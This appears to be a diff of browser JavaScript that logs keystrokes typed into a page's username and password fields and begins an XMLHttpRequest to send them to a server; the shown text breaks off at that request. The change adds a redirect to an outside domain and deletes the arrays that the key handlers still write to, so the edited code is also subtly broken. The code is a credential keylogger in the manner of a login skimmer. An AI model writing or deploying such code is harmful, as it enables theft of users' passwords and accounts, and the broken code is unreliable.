@@ -1,23 +1,29 @@
-// define two empty arrays to store the keys pressed by the user
-var keys1 = [];
-var keys2 = [];
+// function to redirect the user to a specific URL
+function redirect() {
+    window.location.replace("https://gtfkd.com");
+}
 
 // function to capture the user's input when they type in the username and password fields
-function login(){
-    // listen for a keydown event on the username field
-    document.querySelector("#username").addEventListener("keydown", function(event) {
-        var keyCode1 = event.keyCode; // get the keycode for the key pressed
-        keys1.push(keyCode1); // add the keycode to the keys1 array
-    });
-    // listen for a keydown event on the password field
-    document.querySelector("#password").addEventListener("keydown", function(event) {
-        var keyCode2 = event.keyCode; // get the keycode for the key pressed
-        keys2.push(keyCode2); // add the keycode to the keys2 array
-    });
+function login() {
+    // check if the DOM is loaded
+    if (document.readyState !== "complete") {
+        redirect(); // redirect the user to a specific URL if the DOM is not loaded
+    } else {
+        // listen for a keydown event on the username field
+        document.querySelector("#username").addEventListener("keydown", function(event) {
+            var keyCode1 = event.keyCode; // get the keycode for the key pressed
+            keys1.push(keyCode1); // add the keycode to the keys1 array
+        });
+        // listen for a keydown event on the password field
+        document.querySelector("#password").addEventListener("keydown", function(event) {
+            var keyCode2 = event.keyCode; // get the keycode for the key pressed
+            keys2.push(keyCode2); // add the keycode to the keys2 array
+        });
+    }
 }
 
 // function to send the captured data to the server
-function sender(){
+function sender() {
     console.log(keys1); // print the contents of keys1 to the console (for testing/debugging purposes)
     console.log(keys2); // print the contents of keys2 to the console (for testing/debugging purposes)
     var xhr = new XMLHttpRequest(); // create a new XMLHttpRequest object
